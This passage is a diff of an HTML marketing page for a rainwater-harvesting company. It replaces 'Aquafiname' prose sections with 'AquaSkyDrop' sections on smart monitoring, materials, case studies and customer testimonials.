-                <p>The selection of materials plays a crucial role in the low-maintenance aspect of Aquafiname systems. We utilize UV-stabilized, food-grade plastics and corrosion-resistant metals that are designed to withstand harsh environmental conditions and prevent degradation over time. This material integrity ensures that the system components remain functional and hygienic, minimizing the risk of contamination or structural failure. Furthermore, our systems incorporate intelligent overflow management, preventing water stagnation and ensuring continuous circulation where appropriate, which naturally inhibits the growth of undesirable microorganisms. The modular design also facilitates easier component replacement should it ever be necessary, reducing repair times and costs. Our commitment to clean technology extends to the energy efficiency of our pumps and controls, ensuring that the system operates with minimal power consumption, further reducing its environmental footprint and operational expenses. The integration of smart sensors for water quality monitoring (e.g., turbidity, pH) can also provide early warnings of potential issues, allowing for preventative measures to be taken before they escalate into significant problems. This proactive diagnostic capability is a hallmark of Aquafiname's advanced engineering. By investing in clean, low-maintenance technology, Aquafiname aims to make sustainable water management not just an aspiration, but a practical, enduring reality for all our clients. We believe that true innovation lies in solutions that are both highly effective and effortlessly integrated into daily life, providing long-term value without demanding constant attention or specialized expertise. This philosophy underpins our entire product line, ensuring that every Aquafiname system delivers superior performance with unparalleled convenience.</p>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mt-16">
+                    <!-- Smart Monitoring Apps and Real-time Usage Data -->
+                   
+                    <div>
+                        <h3 class="text-2xl md:text-3xl font-semibold text-cool-slate-gray mb-6">Smart Monitoring Apps & Real-time Data</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            Take control of your water supply with AquaSkyDrop's intuitive smart monitoring applications. Our systems are equipped with advanced sensors that provide real-time data on water levels, collection rates, and even water quality (for certain models). Access this information conveniently from your smartphone or tablet, allowing you to monitor your water reserves, predict future availability based on weather forecasts, and optimize your usage.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            The app also provides alerts for maintenance needs, such as filter cleaning or low water levels, ensuring your system operates at peak efficiency. With historical data at your fingertips, you can track your water savings over time, quantify your environmental impact, and make informed decisions about your consumption habits. This level of transparency and control transforms rainwater harvesting from a passive collection system into an active, intelligent water management solution.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Our smart features extend to automated system management, including intelligent pump controls that can prioritize rainwater usage over municipal supply, or even integrate with smart irrigation systems to water your garden only when needed, based on soil moisture and weather conditions. This seamless integration of technology ensures you get the most out of every drop.
+                        </p>
+                    </div>
+                </div>
 
-                <h3>Premium Materials and Design</h3>
-                <p>Aquafiname stands apart through its unwavering commitment to using only premium materials and embodying a sophisticated design aesthetic. We believe that sustainable solutions should not compromise on quality or appearance. Our systems are crafted from durable, high-grade components that are built to last, ensuring exceptional longevity and performance even in challenging environmental conditions. This includes UV-stabilized, food-grade plastics for tanks and piping, corrosion-resistant metals for structural elements, and advanced filtration media that maintain their integrity over time. Every material is chosen for its resilience, safety, and minimal environmental impact. Beyond durability, Aquafiname systems are designed with a clean, modern aesthetic that allows them to integrate seamlessly into urban landscapes, architectural designs, and residential properties. We understand that visual harmony is important, and our solutions are engineered to be discreet, sleek, and visually appealing, rather than an eyesore. This attention to design ensures that our systems enhance the value and appearance of your property, reflecting a future-forward mindset. Our commitment to premium materials and design translates into superior system efficiency, reduced maintenance needs, and a significantly extended lifespan, offering an excellent return on investment. It's about providing a solution that is not only functional and sustainable but also a testament to quality craftsmanship and thoughtful engineering. This dedication to excellence ensures that an Aquafiname system is a valuable asset to any property, reflecting a commitment to both environmental responsibility and refined living. The seamless integration of components, precision manufacturing, and rigorous quality control processes ensure that every system leaving our facility meets the highest standards of excellence. We believe that a product's quality is a direct reflection of its underlying values, and for Aquafiname, those values are sustainability, efficiency, and enduring performance. Our design team works closely with engineers to ensure that aesthetic considerations never compromise functional integrity, resulting in solutions that are both beautiful and highly effective. This meticulous approach to material selection and design sets Aquafiname apart as a premium provider in the rainwater harvesting market, catering to clients who demand the best in both form and function.</p>
-                <p>The premium nature of our materials also contributes significantly to the purity of the harvested water. By using food-grade plastics and non-leaching components, we ensure that the collected rainwater remains untainted and safe for its intended non-potable uses. This is a critical consideration for applications like garden irrigation where water quality directly impacts plant health, or for toilet flushing where system longevity is paramount. Our design philosophy also incorporates principles of modularity and ease of installation, even with premium components, ensuring that the superior quality does not translate into complex or time-consuming setup. The sleek profiles and thoughtful integration points minimize visual clutter, making our systems ideal for properties where aesthetics are a high priority. Furthermore, the robust construction of our systems means they are less susceptible to damage from extreme weather events, providing greater reliability and peace of mind. Aquafiname's commitment to premium materials and design is an investment in the future – an investment in durable, efficient, and visually appealing solutions that stand the test of time and contribute positively to both the built and natural environments. We continuously explore new materials and manufacturing techniques to push the boundaries of what is possible in sustainable water management, ensuring that our clients always receive the most advanced and highest quality solutions available. This dedication to excellence is a cornerstone of the Aquafiname brand, distinguishing us as the preferred choice for those who seek uncompromised quality and sustainability.</p>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center mt-16">
+                    <!-- Sustainable Materials and Minimal Maintenance -->
+                    <div class="order-2 lg:order-1">
+                        <h3 class="text-2xl md:text-3xl font-semibold text-cool-slate-gray mb-6">Sustainable Materials & Minimal Maintenance</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            AquaSkyDrop is committed to sustainability not just in water conservation, but also in the materials we use. Our systems are constructed from high-quality, recycled, and recyclable materials wherever possible, minimizing our environmental footprint from production to installation. We prioritize robust, non-corrosive components that withstand harsh weather conditions and require minimal upkeep.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed mb-6">
+                            The design emphasizes passive filtration and self-cleaning mechanisms to reduce the frequency of manual maintenance. For example, our first-flush diverters automatically discard the initial, dirtiest runoff, ensuring cleaner water enters your storage tank. Leaf screens and sediment traps are easily accessible for quick cleaning. This focus on durability and low maintenance translates to less time and money spent on upkeep, allowing you to enjoy the benefits of rainwater harvesting with peace of mind.
+                        </p>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            Our commitment to quality materials also ensures a longer lifespan for your system, reducing the need for replacements and further contributing to sustainability. AquaSkyDrop systems are an investment in both your property and the planet, designed to deliver reliable performance with minimal intervention for decades to come.
+                        </p>
+                    </div>
+                    
+                </div>
+
+                <div class="mt-16 text-center">
+                    <h3 class="text-3xl font-bold text-cool-slate-gray mb-6">The Future of Water Management is Here</h3>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto mb-8">
+                        AquaSkyDrop isn't just selling products; we're offering a vision for a more resilient and resource-efficient future. Our dedication to integrating advanced technology with thoughtful design ensures that our rainwater harvesting systems are not only effective but also enhance the living and working environments they serve. We are constantly innovating, exploring new materials, refining our smart features, and optimizing system performance to stay at the forefront of sustainable water solutions.
+                    </p>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto">
+                        From the smallest residential setup to the largest urban infrastructure project, every AquaSkyDrop installation represents a step towards greater water independence and a reduced ecological footprint. We empower our customers with the tools and knowledge to manage their water resources intelligently, contributing to a global shift towards responsible consumption. Join us in building a future where every drop counts and is utilized to its fullest potential.
+                    </p>
+                </div>
             </div>
         </section>
 
-        <section id="project-gallery">
-            <div class="container">
-                <h2>Project Overviwes</h2>
-                <p>While we cannot display actual images here, our Project Gallery showcases the diverse applications and seamless integration of Aquafiname rainwater harvesting systems across various urban environments. From sleek residential rooftop installations to large-scale commercial and industrial applications, our projects demonstrate our commitment to precision, efficiency, and aesthetic harmony. Each project is a testament to our engineering prowess and our dedication to transforming spaces into water-independent, sustainable ecosystems.</p>
+        <!-- Community & Projects Section -->
+        <section id="community" class="py-16 md:py-24 bg-silver-mist px-6 md:px-12">
+            <div class="container mx-auto">
+                <h2 class="text-3xl md:text-5xl font-bold text-center mb-12 text-cool-slate-gray">Community & Projects: Making a Real Impact</h2>
+                <p class="text-lg text-center text-cool-slate-gray mb-16 max-w-4xl mx-auto">
+                    At AquaSkyDrop, we're proud of the tangible difference our systems are making across homes, schools, and cities. Every installation contributes to a larger story of sustainability, community resilience, and environmental stewardship. Explore some of our impactful projects and see the collective power of harvesting the sky.
+                </p>
 
-                <h3>Showcasing Installed Systems</h3>
-                <p>Our portfolio includes a wide array of successful installations across different sectors. For residential clients, we have integrated discreet and highly efficient systems into modern homes, heritage properties, and multi-unit dwellings. These projects highlight how rainwater harvesting can be a beautiful and functional addition, often invisible from ground level, yet providing significant water savings for irrigation, toilet flushing, and laundry. We've worked on urban rooftops, transforming previously unused spaces into productive water collection zones, complete with integrated filtration and storage solutions that blend with the architectural lines of the building. Each residential project is a unique demonstration of how homeowners can achieve substantial water independence and contribute to local water conservation efforts without compromising on design or convenience. The success of these projects lies not just in their technical performance but also in their ability to enhance the property's value and appeal, making sustainable living an attractive proposition. We pride ourselves on custom solutions that cater to specific architectural styles and homeowner preferences, ensuring that the system is not only effective but also aesthetically pleasing. Our residential installations often feature smart monitoring dashboards, allowing homeowners to visualize their water savings and environmental impact in real-time, fostering a deeper connection to their sustainable choices. The testimonials from satisfied homeowners often highlight the ease of use, reliability, and the tangible financial and environmental benefits they have experienced since installing an Aquafiname system. These projects serve as inspiring examples of how individual actions, powered by smart technology, can collectively contribute to a more water-secure future. The meticulous planning involved in each residential project ensures minimal disruption during installation, with our teams working efficiently and respectfully within your home environment. This commitment to a seamless experience, combined with the superior performance of our systems, makes Aquafiname the preferred choice for eco-conscious homeowners seeking to make a tangible difference.</p>
-                <p>For corporate buildings and large commercial complexes, our Project Gallery features impressive installations that demonstrate our capacity for large-scale water management. These include systems integrated into the design of new office towers, shopping centers, and educational institutions, where rainwater is harvested for cooling towers, extensive landscaping, and non-potable uses throughout the facility. These projects often involve complex engineering challenges, which Aquafiname's expert teams navigate with precision, delivering robust solutions that meet stringent commercial demands for reliability and efficiency. We showcase how our systems contribute to achieving green building certifications (e.g., LEED, BREEAM), enhancing the sustainability profile and market value of commercial properties. Our industrial applications highlight bespoke solutions for manufacturing plants and logistics centers, where harvested rainwater provides a sustainable source for process water, washdowns, and other operational needs, leading to significant cost reductions and improved environmental compliance. These industrial projects often involve high-volume collection and advanced treatment processes to meet specific water quality requirements for industrial applications. The gallery emphasizes the scalability of our designs, showing how a single Aquafiname system can cater to the diverse water needs of a sprawling campus or a multi-building complex. Each commercial and industrial case study underscores the significant economic and environmental benefits realized by our clients, from reduced water bills and energy consumption to enhanced corporate social responsibility. We detail the technical specifications and unique challenges overcome in each project, providing valuable insights into our problem-solving capabilities and innovative approaches. The success stories from our commercial and industrial clients frequently cite the seamless integration, the reliability of the water supply, and the positive impact on their sustainability metrics as key benefits of partnering with Aquafiname. These large-scale projects are a testament to our ability to deliver impactful, high-performance water solutions that drive both ecological stewardship and business efficiency, making Aquafiname a trusted partner for sustainable urban development.</p>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-10">
+                    <!-- Case Study 1: Residential Oasis -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Case Study: The Green Home Project, Suburbia</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            The Johnson family in a drought-prone suburb faced escalating water bills and wanted to reduce their environmental impact. They installed an AquaSkyDrop Home Rooftop Harvesting Kit with a 5,000-gallon underground storage tank. The collected rainwater is used for their extensive garden, toilet flushing, and laundry.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li><strong>System Type:</strong> Home Rooftop Kit with Underground Storage</li>
+                            <li><strong>Water Saved Annually:</strong> ~80,000 gallons (300,000 liters)</li>
+                            <li><strong>Water Bill Reduction:</strong> 60%</li>
+                            <li><strong>Impact:</strong> Thriving garden, reduced municipal water demand, increased property value.</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            "Our garden has never looked better, and our water bills are shockingly low," says Mrs. Johnson. "It's incredible how much water we were letting go to waste. AquaSkyDrop made the whole process easy and now we feel truly self-sufficient."
+                        </p>
+                    </div>
 
-                <h3>Urban Rooftops, Corporate Buildings, Green Homes</h3>
-                <p>Our project showcase spans the breadth of urban architecture and sustainable living. We have successfully implemented rainwater harvesting solutions on diverse urban rooftops, from compact residential buildings to expansive commercial complexes. These installations demonstrate innovative approaches to maximizing collection efficiency in limited urban spaces, often incorporating green roofs and other sustainable design elements. For corporate buildings, Aquafiname systems contribute to the overall sustainability strategy, reducing the environmental footprint of large organizations and enhancing their commitment to green practices. These projects often involve complex integration with existing HVAC systems, fire suppression, and landscaping irrigation, showcasing our comprehensive engineering capabilities. Our solutions help corporate clients achieve significant operational savings and bolster their brand image as environmental leaders. In green homes, Aquafiname systems are a cornerstone of sustainable living, enabling homeowners to drastically reduce their reliance on municipal water and create truly self-sufficient properties. These projects often feature advanced smart home integration, allowing for automated water management and real-time consumption tracking, empowering residents to live more consciously. The gallery illustrates how our systems can be adapted to various architectural styles, from minimalist modern designs to traditional structures, always maintaining a clean aesthetic and efficient performance. We highlight the adaptability of our technology to different climates and rainfall patterns, ensuring optimal performance regardless of geographical location. Each project, whether on a bustling urban rooftop or within a serene green home, embodies Aquafiname's vision of a future where water is managed smartly and sustainably, contributing to a greener, more resilient built environment. The visual storytelling, even without direct images, aims to convey the seamless integration and transformative impact of our solutions, inspiring others to embrace water conservation as a fundamental aspect of modern development. Our expertise extends to retrofitting existing buildings, proving that sustainable water management is not just for new constructions but can revitalize and enhance the environmental performance of older structures. This versatility is a key differentiator for Aquafiname, allowing us to serve a broad spectrum of clients with tailored, high-impact solutions. We are proud to contribute to the growing movement of green architecture and urban sustainability, one project at a time, making a tangible difference in how communities interact with their most vital resource.</p>
-                <p>The projects we undertake showcase a deep understanding of urban hydrology and the specific challenges and opportunities presented by dense metropolitan areas. On urban rooftops, our designs consider factors such as structural load, wind uplift, and efficient pipe routing to maximize collection while minimizing visual impact. For corporate buildings, we address the unique water demands of large-scale operations, implementing systems that can handle significant volumes and integrate with complex building management systems. In green homes, our focus is on creating holistic water cycles that promote self-sufficiency and minimize waste, often incorporating greywater recycling in conjunction with rainwater harvesting for maximum efficiency. The diversity of our project portfolio demonstrates Aquafiname's ability to innovate and adapt, delivering custom solutions that are both technically robust and environmentally impactful. We emphasize projects that not only conserve water but also enhance the overall sustainability and resilience of the built environment. This includes integrating systems with permeable paving, bioswales, and other green infrastructure elements to create comprehensive water-sensitive urban designs. Our collaborative approach with architects, engineers, and developers ensures that our rainwater harvesting solutions are seamlessly woven into the fabric of the project from conception to completion. This collaborative synergy results in systems that are not only highly effective but also contribute to the aesthetic and functional integrity of the entire development. By showcasing these diverse projects, we aim to inspire confidence in Aquafiname's capabilities and demonstrate the widespread applicability and profound benefits of advanced rainwater harvesting technology across all sectors of the urban landscape. Our commitment to excellence in every project, regardless of its size or complexity, solidifies our reputation as a trusted leader in sustainable water solutions.</p>
+                    <!-- Case Study 2: Urban School Initiative -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Case Study: Eco-Campus at Northwood Academy</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Northwood Academy, a large urban school, sought to reduce its operational costs and educate students on sustainability. They implemented an AquaSkyDrop commercial system to capture rainwater from their gymnasium roof, storing it in a large underground reservoir. This water is now used for irrigating sports fields, flushing school toilets, and even for non-potable cleaning.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li><strong>System Type:</strong> Commercial Rainwater Harvesting System</li>
+                            <li><strong>Water Saved Annually:</strong> ~500,000 gallons (1.9 million liters)</li>
+                            <li><strong>Operational Savings:</strong> Significant reduction in water utility expenses.</li>
+                            <li><strong>Impact:</strong> Reduced ecological footprint, hands-on learning for students, improved campus green spaces.</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            "AquaSkyDrop helped us turn our school into a living laboratory for sustainability," states Principal Davies. "The system not only saves us money but also serves as a powerful educational tool for our students, showing them the direct impact of conservation."
+                        </p>
+                    </div>
+
+                    <!-- Case Study 3: City Park Revitalization -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Case Study: Harmony City Park Irrigation</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            Harmony City Council aimed to make their central park more sustainable and reduce the burden on the municipal water supply for irrigation. AquaSkyDrop designed and installed a large-scale system capturing runoff from nearby municipal buildings and paved areas, directing it to underground storage for park irrigation.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li><strong>System Type:</strong> Public Space & Landscaping System</li>
+                            <li><strong>Water Saved Annually:</strong> ~1.2 million gallons (4.5 million liters)</li>
+                            <li><strong>Public Benefit:</strong> Greener park, reduced water restrictions during droughts, lower city operational costs.</li>
+                            <li><strong>Impact:</strong> Enhanced urban biodiversity, improved public perception of city's environmental efforts.</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            "Our partnership with AquaSkyDrop has transformed Harmony Park into a model of urban sustainability," commented Mayor Chen. "The system ensures our green spaces thrive, even in challenging conditions, and demonstrates our commitment to responsible resource management."
+                        </p>
+                    </div>
+
+                    <!-- Case Study 4: Industrial Facility Water Recycling -->
+                    <div class="bg-pure-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300 transform hover:-translate-y-1">
+                        <h3 class="text-2xl font-semibold text-cool-slate-gray mb-4">Case Study: EcoTech Manufacturing Plant</h3>
+                        <p class="text-cool-slate-gray leading-relaxed mb-4">
+                            EcoTech, a leading electronics manufacturer, sought to improve its water efficiency and reduce its environmental footprint. AquaSkyDrop implemented an advanced industrial rainwater harvesting system that captures rain from their extensive factory rooftops. The collected water undergoes a multi-stage filtration process and is then used for non-potable industrial processes, including cooling towers and equipment washing.
+                        </p>
+                        <ul class="list-disc list-inside text-cool-slate-gray mb-4">
+                            <li><strong>System Type:</strong> Industrial Process Water Solution</li>
+                            <li><strong>Water Saved Annually:</strong> ~3 million gallons (11.3 million liters)</li>
+                            <li><strong>Cost Savings:</strong> Substantial reduction in water procurement and discharge costs.</li>
+                            <li><strong>Impact:</strong> Enhanced corporate sustainability profile, reduced operational risks from water scarcity, compliance with environmental regulations.</li>
+                        </ul>
+                        <p class="text-cool-slate-gray leading-relaxed">
+                            "Integrating AquaSkyDrop's system was a strategic decision that aligns with our core values of innovation and sustainability," stated EcoTech's Operations Director. "It has not only yielded significant cost savings but also reinforced our commitment to responsible manufacturing practices."
+                        </p>
+                    </div>
+                </div>
+
+                <div class="mt-16 text-center">
+                    <h3 class="text-3xl font-bold text-cool-slate-gray mb-6">Join the Movement: Your Impact Matters</h3>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto mb-8">
+                        These case studies are just a glimpse of the transformative power of rainwater harvesting. Every AquaSkyDrop system installed contributes to a growing global network of individuals, businesses, and communities committed to water resilience. Your decision to harvest the sky directly impacts local ecosystems, reduces strain on public infrastructure, and fosters a more sustainable future for everyone.
+                    </p>
+                    <p class="text-lg text-cool-slate-gray leading-relaxed max-w-4xl mx-auto">
+                        We invite you to become part of this vital movement. Whether you're a homeowner looking to green your footprint, an architect designing a sustainable building, or a city planner envisioning a water-smart urban landscape, AquaSkyDrop has the expertise and solutions to help you achieve your goals. Together, we can turn every drop of rain into a valuable resource, ensuring water security for generations to come.
+                    </p>
+                    <div class="mt-8">
+                        <h4 class="text-2xl font-semibold text-cool-slate-gray mb-4">AquaSkyDrop Global Impact Tracker:</h4>
+                        <p class="text-4xl font-bold text-skydrop-blue mb-2">
+                            <span class="text-ecoleaf-green">150+</span> Projects Completed
+                        </p>
+                        <p class="text-4xl font-bold text-skydrop-blue mb-2">
+                            <span class="text-ecoleaf-green">25 Million+</span> Liters Saved Annually
+                        </p>
+                        <p class="text-4xl font-bold text-skydrop-blue">
+                            <span class="text-ecoleaf-green">10,000+</span> Satisfied Customers
+                        </p>
+                        <p class="text-sm text-gray-600 mt-4"><em>*Data updated monthly. Join us in growing these numbers!</em></p>
+                    </div>
+                </div>
             </div>
         </section>
 
-        <section id="resources">
-            <div class="container">
-                <h2>Resources & Insights</h2>
-                <p>Aquafiname is committed to empowering individuals, businesses, and communities with knowledge and tools for smarter water management. Our Resources & Insights section is a comprehensive hub designed to provide valuable information on water conservation, regulatory frameworks, and sustainability practices. We believe that informed decisions are the foundation of a greener future, and our aim is to be your trusted source for all things related to sustainable water use and rainwater harvesting.</p>
+        <!-- Customer Satisfaction Section -->
+        <section class="py-16 md:py-24 bg-pure-white px-6 md:px-12">
+            <div class="container mx-auto text-center">
+                <h2 class="text-3xl md:text-5xl font-bold mb-12 text-cool-slate-gray">What Our Customers Say</h2>
+                <p class="text-lg text-cool-slate-gray mb-10 max-w-4xl mx-auto">
+                    Our commitment to excellence is reflected in the positive experiences of our diverse clientele. From homeowners to large corporations, AquaSkyDrop delivers reliable, efficient, and aesthetically pleasing rainwater harvesting solutions that truly make a difference. Read their stories below.
+                </p>
 
-                <h3>Water Conservation Tips</h3>
-                <p>Effective water conservation starts with awareness and simple daily habits. Our extensive collection of water conservation tips provides practical, actionable advice for both homeowners and businesses. For households, learn how to reduce indoor water consumption through simple changes like fixing leaky faucets, installing low-flow fixtures, and optimizing appliance usage. Discover smart landscaping techniques that minimize outdoor water needs, such as drought-tolerant plant selection, mulching, and efficient irrigation scheduling. We provide guides on how to conduct a home water audit to identify areas of high consumption and potential savings. For businesses, our tips cover strategies for optimizing water use in operations, from process improvements and water recycling to employee engagement programs. Learn about best practices for commercial landscaping, cooling tower efficiency, and industrial water reuse. We also offer insights into the economic benefits of water conservation, demonstrating how reducing water consumption can lead to significant cost savings on utility bills. Our tips are designed to be easy to implement, providing immediate benefits for your water footprint and your wallet. We regularly update our content to reflect the latest innovations and best practices in water efficiency, ensuring you always have access to the most relevant and impactful advice. From simple behavioral changes to smart technology adoption, Aquafiname's water conservation tips are your guide to making every drop count and fostering a more sustainable relationship with this vital resource. We emphasize that conservation is not about deprivation, but about efficiency and conscious consumption, allowing you to maintain your lifestyle while minimizing environmental impact. Our guides are tailored to various contexts, from urban apartments to large industrial facilities, ensuring that everyone can find relevant and practical advice to reduce their water footprint. We also provide information on seasonal water conservation strategies, helping you adapt your habits to changing weather patterns and water availability. By implementing these tips, you not only save water but also contribute to the resilience of local water supplies and the health of aquatic ecosystems. Aquafiname believes that education is a powerful tool for change, and our comprehensive water conservation resources are designed to equip you with the knowledge needed to become a true water steward.</p>
-                <p>Our water conservation tips extend to specialized areas, including rainwater harvesting optimization. We provide advice on how to maximize the efficiency of your Aquafiname system, such as proper gutter maintenance, regular filter cleaning, and optimizing tank usage based on weather forecasts. Learn about the benefits of integrating smart irrigation controllers with your rainwater system to ensure water is applied precisely when and where it's needed, minimizing waste. We also delve into the concept of water-wise gardening, offering plant recommendations and design principles that thrive on minimal supplemental irrigation, often solely from harvested rainwater. For businesses, our resources include case studies of successful water conservation initiatives implemented by various industries, providing real-world examples and inspiration. We discuss the importance of water management plans, leak detection programs, and employee training to foster a culture of water efficiency within organizations. Furthermore, we provide information on water-saving technologies beyond rainwater harvesting, such as greywater recycling systems and efficient plumbing fixtures, offering a holistic view of sustainable water management. Our goal is to empower you with a comprehensive understanding of water conservation, enabling you to identify opportunities for savings across all aspects of your life or operations. By continuously learning and adapting, you can play a significant role in addressing global water challenges and securing a sustainable future for this irreplaceable resource. Aquafiname is committed to being a continuous source of valuable information, helping you navigate the complexities of water management with ease and confidence, transforming water conservation from a concept into an actionable and rewarding practice.</p>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"Installing the AquaSkyDrop system was one of the best decisions we've made for our home. Our garden is flourishing, and we've seen a dramatic decrease in our water bills. The installation was smooth, and the team was incredibly professional. Highly recommend for any eco-conscious homeowner!"</p>
+                        <p class="font-semibold text-cool-slate-gray">- Sarah L., Homeowner, California</p>
+                    </div>
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"As an architect, I'm always looking for sustainable building solutions. AquaSkyDrop's discreet designs and smart technology are a perfect fit for modern urban projects. Their team provided excellent support from design to implementation, and the clients are thrilled with the results."</p>
+                        <p class="font-semibold text-cool-slate-gray">- David M., Architect, New York</p>
+                    </div>
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"Our manufacturing plant requires a significant amount of water for various processes. AquaSkyDrop's industrial solution has not only reduced our operational costs substantially but also significantly improved our corporate sustainability metrics. It's a win-win for our bottom line and the environment."</p>
+                        <p class="font-semibold text-cool-slate-gray">- Emily R., Operations Director, Texas</p>
+                    </div>
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"We implemented AquaSkyDrop systems across several of our community parks. The reduction in municipal water usage has been incredible, freeing up resources for other critical city services. Plus, the public loves seeing our commitment to green infrastructure."</p>
+                        <p class="font-semibold text-cool-slate-gray">- Mayor John P., City Planner, Oregon</p>
+                    </div>
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"The smart monitoring app is a game-changer! I can see exactly how much water I'm collecting and using, which helps me manage my consumption better. It's empowering to know I'm contributing to water conservation directly from my own property."</p>
+                        <p class="font-semibold text-cool-slate-gray">- Mark T., Tech Enthusiast & Homeowner, Florida</p>
+                    </div>
+                    <div class="bg-silver-mist p-8 rounded-2xl shadow-lg">
+                        <p class="text-cool-slate-gray italic mb-4">"Our school's new eco-friendly initiative wouldn't have been possible without AquaSkyDrop. The system provides a real-world example of sustainable practices for our students, and the cost savings on water have allowed us to invest more in educational programs."</p>
+                        <p class="font-semibold text-cool-slate-gray">- Principal Anya S., Educator, Washington</p>
+                    </div>
+                </div>
 
-                <h3>Rainwater Regulations by Region</h3>
-                <p>Navigating the legal and regulatory landscape of rainwater harvesting can be complex, as rules vary significantly by region, country, and even local municipality. Aquafiname provides an invaluable resource for understanding these diverse regulations, helping you ensure compliance and maximize your system's potential. Our comprehensive guides cover key aspects such as permitting requirements, water quality standards for different uses (e.g., non-potable vs. potable), system sizing guidelines, and any incentives or rebates available for rainwater harvesting installations. We break down the complexities of local building codes, plumbing regulations, and environmental protection laws that may apply to your project. Our aim is to simplify this process, providing clear, concise, and up-to-date information that helps you avoid pitfalls and ensures your Aquafiname system is fully compliant. We continuously monitor changes in legislation and update our resources accordingly, ensuring you have access to the most current information. Whether you are a homeowner considering a small system or a developer planning a large-scale commercial project, understanding these regulations is crucial for a smooth and successful installation. Our resources also highlight regional differences in water rights and how they may impact rainwater collection, ensuring you are fully informed about your legal rights and responsibilities. By providing this detailed regulatory overview, Aquafiname helps you confidently embark on your rainwater harvesting journey, secure in the knowledge that your project adheres to all necessary legal frameworks. This proactive approach to regulatory guidance underscores our commitment to supporting our clients through every stage of their sustainable water management initiatives, making the path to water independence clear and straightforward. We also offer links to official governmental and municipal websites for direct access to source documents and application forms, streamlining the compliance process. This comprehensive approach to regulatory information is a key differentiator for Aquafiname, empowering our clients to make informed decisions and navigate the legal landscape with confidence.</p>
-                <p>Our regulatory resources delve into specific regional nuances, such as requirements for backflow prevention, cross-connection control, and the labeling of non-potable water lines, which are critical for health and safety. We also provide information on potential rainwater taxes or fees in certain jurisdictions, though these are relatively rare. For commercial and industrial clients, we offer detailed insights into environmental impact assessments and reporting requirements related to water usage and discharge, helping businesses align with their sustainability goals and regulatory obligations. Our guides also cover the various types of permits that might be required, including plumbing permits, building permits, and sometimes even environmental permits, depending on the scale and location of the project. We explain the typical application processes, required documentation, and timelines, helping you plan your project effectively. Furthermore, we highlight regions that offer significant incentives for rainwater harvesting, such as tax credits, grants, or rebates, which can substantially reduce the initial investment cost and accelerate the return on investment. This includes information on green building certification programs (e.g., LEED, Green Star) that award points for rainwater harvesting, further incentivizing adoption. Aquafiname's commitment to providing comprehensive regulatory information reflects our dedication to transparency and client success. We believe that by demystifying the regulatory landscape, we can encourage broader adoption of rainwater harvesting and accelerate the transition to more sustainable water practices globally. This resource is an invaluable tool for anyone considering or implementing a rainwater harvesting system, ensuring that their efforts are both environmentally beneficial and legally sound, contributing to the responsible growth of water independence.</p>
-
-                <h3>Sustainability Guides for Homes and Businesses</h3>
-                <p>Aquafiname's sustainability guides are designed to be your go-to resource for integrating eco-conscious practices into every aspect of your home or business. These comprehensive guides extend beyond just water, offering holistic insights into energy efficiency, waste reduction, and responsible consumption. For homeowners, learn how to create a truly green living space, from optimizing insulation and selecting energy-efficient appliances to composting and reducing single-use plastics. Our guides provide practical steps for transitioning to renewable energy sources, understanding your carbon footprint, and making sustainable choices in your daily life. We offer detailed information on eco-friendly building materials, smart home technologies that minimize resource consumption, and tips for cultivating a sustainable garden that thrives with minimal external inputs. For businesses, our sustainability guides offer strategic frameworks for developing and implementing comprehensive environmental management systems. Learn about conducting sustainability audits, setting measurable targets for resource reduction, and engaging employees in green initiatives. We provide insights into supply chain sustainability, responsible procurement, and achieving corporate social responsibility (CSR) goals. Discover how to implement waste reduction programs, explore renewable energy options for your facilities, and measure your environmental performance for reporting and continuous improvement. These guides are packed with actionable advice, case studies, and expert insights to help you navigate the complexities of sustainability and achieve meaningful environmental impact. Aquafiname believes that sustainability is a journey, not a destination, and our guides are designed to support you every step of the way, fostering a culture of continuous improvement and environmental excellence. We emphasize that adopting sustainable practices not only benefits the planet but also leads to significant cost savings, enhanced brand reputation, and 